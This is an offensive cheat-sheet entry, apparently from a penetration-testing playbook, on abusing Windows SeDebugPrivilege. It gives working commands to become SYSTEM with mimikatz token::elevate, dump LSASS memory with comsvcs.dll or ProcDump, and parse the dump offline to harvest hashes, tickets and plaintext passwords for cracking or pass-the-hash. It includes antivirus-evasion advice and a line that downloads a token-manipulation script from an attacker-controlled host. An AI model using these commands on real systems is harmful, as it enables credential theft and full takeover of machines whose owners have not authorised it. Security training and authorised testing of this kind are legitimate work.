title: SeDebugPrivilege — Abuse to SYSTEM / LSASS
body: SeDebugPrivilege lets you open and read ANY process, including SYSTEM-owned ones. Two payoffs: enable it and steal a SYSTEM token (mimikatz token::elevate) to become SYSTEM directly, or dump LSASS to harvest every logged-on user's hashes, tickets, and plaintext for cracking / pass-the-hash. You'll see it on service accounts and after some misconfig privescs. Disabled state doesn't matter — the tool enables it. Dumping LSASS and parsing offline on Kali is the AV-safe route when mimikatz gets flagged on disk.
cmd:
# ══ ⭐ HAVE SeDebugPrivilege? — two payoffs ══════════════════════════
# SeDebug lets you OPEN any process, including SYSTEM-owned ones. That gives:
#   A) become SYSTEM  — enable the priv, grab a SYSTEM token
#   B) dump LSASS     — read everyone's hashes / tickets / plaintext from memory
# Disabled != absent (the tool enables it). Works as a NON-admin service acct.
whoami /priv | findstr /i SeDebug        # confirm it's present

# ══════════════════════════════════════════════════════
# A) SeDebug → SYSTEM  (mimikatz token::elevate)
# ══════════════════════════════════════════════════════
.\mimikatz.exe
mimikatz # privilege::debug      # enables SeDebug -> "Privilege '20' OK"
mimikatz # token::elevate        # impersonate a SYSTEM token
mimikatz # token::whoami         # confirm NT AUTHORITY\SYSTEM
mimikatz # token::run /program:"C:\Windows\Temp\shell.exe"   # spawn shell as SYSTEM

# One-shot (non-interactive):
.\mimikatz.exe "privilege::debug" "token::elevate" "token::run /program:cmd.exe" "exit"

# ══════════════════════════════════════════════════════
# B) SeDebug → dump LSASS → parse creds OFFLINE
# ══════════════════════════════════════════════════════
# comsvcs.dll — LOLBIN, nothing to upload. Get the LSASS PID first:
Get-Process lsass | select -Expand Id        # or: tasklist /fi "imagename eq lsass.exe"
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass-pid> C:\Windows\Temp\lsass.dmp full
# or ProcDump (Sysinternals, signed — often AV-safe):
.\procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp

# Parse on KALI (don't run sekurlsa on-box if AV is hot):
pypykatz lsa minidump lsass.dmp
# or mimikatz:  sekurlsa::minidump lsass.dmp   then   sekurlsa::logonpasswords
# -> feed NT hashes to hashcrack / pass-the-hash.

# ══════════════════════════════════════════════════════
# C) Inject into a SYSTEM process  (alt to token::elevate)
# ══════════════════════════════════════════════════════
# PowerShell token duplication (psgetsys / Invoke-TokenManipulation):
iwr http://$lhost/psgetsys.ps1 -OutFile psgetsys.ps1 ; . .\psgetsys.ps1
Get-Process winlogon | select -Expand Id     # pick a SYSTEM-owned PID
ImpersonateFromParentPid -ppid <system-pid> -command "C:\Windows\Temp\shell.exe" -cmdargs ""

# ── GOTCHAS ──────────────────────────────────────────
# - Disabled state is normal — privilege::debug enables it; presence is what counts.
# - AV flags mimikatz on disk -> use route B (dump LSASS, parse on Kali).
# - meterpreter 'getsystem' uses this under the hood; manual = OSCP-safe.
warn: SeDebug is top-tier: it's a direct SYSTEM path AND a full-LSASS credential dump. Check it early. When AV is present, prefer route B — dump LSASS with comsvcs.dll (a LOLBIN, nothing to upload) or ProcDump, then parse with pypykatz ON KALI rather than running sekurlsa on the box. Disabled != unavailable — privilege::debug enables it.

choices.label: Dumped LSASS — crack / pass-the-hash the creds
